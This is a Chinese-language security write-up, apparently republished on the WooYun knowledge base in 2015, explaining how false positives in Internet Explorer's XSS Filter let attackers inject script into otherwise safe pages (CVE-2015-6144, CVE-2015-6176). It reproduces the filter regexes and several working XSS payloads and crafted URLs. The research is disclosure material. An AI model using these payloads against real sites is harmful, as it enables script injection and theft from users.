<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">XSS Attacks - Exploiting XSS Filter</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">mramydnei</a> <span class="bull">·</span> <time title="2015/12/21 10:11" ui-time="" datetime="2015/12/21 10:11" class="published ng-binding ng-isolate-scope">2015/12/21 10:11</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>from:http://l0.cm/xxn/</p><h1>0x00 前言</h1><hr><p>这又是一篇来自全职赏金猎人Masato kinugawa的神作。一次双杀，用一篇报告拿下了两个CVE，分别是CVE-2015-6144和CVE-2015-6176。报告内容指出IE的XSS Filter在对XSS攻击进行屏蔽时，由于正则的匹配不当在一些场景下会让本不存在XSS漏洞的页面产生XSS漏洞的问题。</p><h1>0x01 IE的XSS Filter</h1><hr><p>Internet Explorer自IE8开始也就是2009年左右的时候首次导入了XSS Filter这一机制。不得不说，XSS Filter让很多安全研究者头疼。因为有时候你还真的就绕不过去。这会让我们产生兴趣说XSS Filter到底是怎么去阻挡xss攻击的。说简单也简单，IE会去比对用户的request和response如果IE认为有害的内容同时出现在了request和response当中，IE就会选择屏蔽掉response中部分xss关键字。（根据情况有时候会屏蔽整个response body）举个例子，如果你用IE像example.com发送如下的请求：</p><pre><code>#!html
http://example.com/?q=&lt;img src=x onerror=alert(1)&gt;
</code></pre><p>那么你看到的response body就会是这样：</p><pre><code>#!html
q param is : &lt;img src=x #error=alert(1)&gt;
</code></pre><p>onerror变成#nerror后这段html确实没有办法执行JavaScript也就谈不上什么XSS攻击。看似非常合理，其实设计上存在非常的大的问题。问题的核心在于IE不会去管response body中出现与request相匹配的内容是原始的response内容还是攻击者发送请求后所增加的内容。可能说的有点绕口，所以我得再举个例子。假设你像example.com发送如下的请求:</p><pre><code>#!html
http://example.com/?q=AAA&amp;&lt;meta charset=
</code></pre><p>即便你没有任何参数（不难想到不看参数是在防范HPP攻击）它也会毅然决然地把原始的meta tag给屏蔽掉。所以response body会变成这样:</p><pre><code>#!php
&lt;m#ta charset=“utf-8”&gt;
</code></pre><p>一次完美的误杀。这也是这两个CVE所利用到的IE的特性之一。居然说到了之一，就肯定有之二。之二是什么呢？之二就是负责防守不同场景下的XSS的正则在特定情况下，产生了交集。所以在这里我得再再举个例子来说明这个问题。在IE负责虐杀XSS的mshtml.dll当中有这么一段正则：</p><pre><code>#!bash
[ /+\t\"\'`]style[ /+\t]*? =.*?([:=]|(&amp;[#()\[\].]x?0*((58)|(3A)| (61)|(3D));?)).*?([(\\]|(&amp;[#()\[\].]x? 0*((40)|(28)|(92)|(5C));?)) 
</code></pre><p>这个正则是用来防谁的呢？就是下面这段xss攻击：</p><pre><code>#!php
&lt;p style="x:expression(alert(1))"&gt;
</code></pre><p>这里的<code>[ /+\t]*?</code>会匹配<code>style</code>和<code>=</code>之间出现多余0的空白字符（<code>0x09-0x0D</code>,<code>0x20</code>,<code>/</code>,<code>+</code>）。看似没有问题，然而研究者再次发现url中出现的<code>“+”</code>可以被任意的<code>[0-6]byte</code>的html内容所匹配。</p><p>也就是说当我们对下面的页面发送类似这样的请求URL:<code>?/style++++++=++=\</code>时</p><pre><code>#!html
&lt;style&gt; body{background:gold} &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;input name="q" value=""&gt;
</code></pre><p>由于URL中的”+”可以被看作是任意的<code>[0-6]byte</code>的html内容，所以从style结束到第一个等号开始的31 bytes内容会被<code>[ /+\t]*?</code>匹配上。浏览器认为这是一次类<code>&lt;p style="x:expression(alert(1))"&gt;</code> 攻击，毫不犹豫的把<code>style</code>替换成<code>st#le</code>，response body再一次变成:</p><pre><code>#!html
&lt;style&gt; body{background:gold} &lt;/st#le&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;input name="q" value=""&gt;
</code></pre><p>又一次的误杀。伴随着误杀xss注入点也瞬间从html attribute content变成css content。这时我们便可以发送请求<code>?q=%0A{}* {x:expression(alert(1))}&amp;/style++++++=++=\</code>来对本不存在xss漏洞的页面进行xss攻击。</p><p><img alt="p1" img-src="8b42b47418e02ce847c8718d525ed61300ef5bc9.jpg"></p><p>类似的误杀还有：</p><p><code>[\"\'][ ]* (([^a-z0-9~_:\'\" ])|(in)) .+?[.].+?=</code></p><p>这段原来是为了防止script content中被注入类似<code>location.href=xxoo</code>的内容时会产生xss的问题。不料却又匹配到了其它的内容。</p><p>请求：</p><p><code>URL：？"/++.+++=</code></p><p>被IE篡改过后的响应：</p><pre><code>#!html
&lt;script src="//example.co#jp/test.js" type="text/javascript"&gt;
&lt;/script&gt;
</code></pre><p>原本该从<code>example.co.jp/test.jp</code>读取的内容代码，却又跑去读example.co去了。这也就意味着针对于特定的域名和特定的目标攻击者是只需要注册example.co然后诱导用户去访问自己构造的<code>example.com/?”/++.+++=</code>就能实现xss攻击。</p><p>URL里没有xss攻击的迹象，页面不存在XSS漏洞，并没有xss注入点，然而这是一次xss攻击。</p><p><img alt="p2" img-src="c9a0297f3197a3f85dd2714c98750c8b13f3ff2b.jpg"></p><p>同一个正则还有可能在这样的场景下出现问题：</p><p><img alt="p3" img-src="8d0750bf7dfa802994695a6caf237e56fd12554a.jpg"></p><p>一旦内容被匹配<code>../1.css</code>就会变成<code>#./1.css</code>也就意味着当前页面会被当作css被加载。构造类似第一个xss vector的攻击向量，我们就可以再一次对不存在xss漏洞的页面进行xss攻击：</p><p><img alt="p4" img-src="8891a2fa17d4860d0f9db895ff755bf11dd65503.jpg"></p><p>这也就是我们所说的其二，正则存在交集的问题。</p><h1>0x02 关于修复</h1><hr><p>facebook和google选择关闭<code>x-xss-protection</code>或者使用<code>1;mode=block</code>来解决这种不可预期的问题。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/150" rel="bookmark" id="re1">Browser Security-css、javascript</a></li><li><a href="http://drops.wooyun.org/tips/845" rel="bookmark" id="re2">Bypass xss过滤的测试方法</a></li><li><a href="http://drops.wooyun.org/tips/879" rel="bookmark" id="re3">fuzzing XSS filter</a></li><li><a href="http://drops.wooyun.org/tips/1955" rel="bookmark" id="re4">XSS Filter Evasion Cheat Sheet 中文版</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Byman</span> <span class="reply-time">2015-12-22 11:25:53</span></div><p></p><p>太厉害了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">f4ckbaidu</span> <span class="reply-time">2015-12-22 10:55:29</span></div><p></p><p>6666，猪队友微软又把大家给卖了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ca1n</span> <span class="reply-time">2015-12-21 16:34:20</span></div><p></p><p>推荐看一下原ppt, 加号等于六字符内容这里简直太巧妙了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ca1n</span> <span class="reply-time">2015-12-21 16:06:27</span></div><p></p><p>也就是说当我们对下面的页面发送类似这样的请求URL:?/style++++++=++=\时</p><p>这段话后面的两小块html似乎显示出了一点问题</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">AK-47</span> <span class="reply-time">2015-12-21 15:37:47</span></div><p></p><p>厉害，这都被你发现了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">青稞</span> <span class="reply-time">2015-12-21 13:33:29</span></div><p></p><p>要不要这样啊。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">数据流</span> <span class="reply-time">2015-12-21 12:08:46</span></div><p></p><p>顶</p><p></p></div></div></div></div></div></main>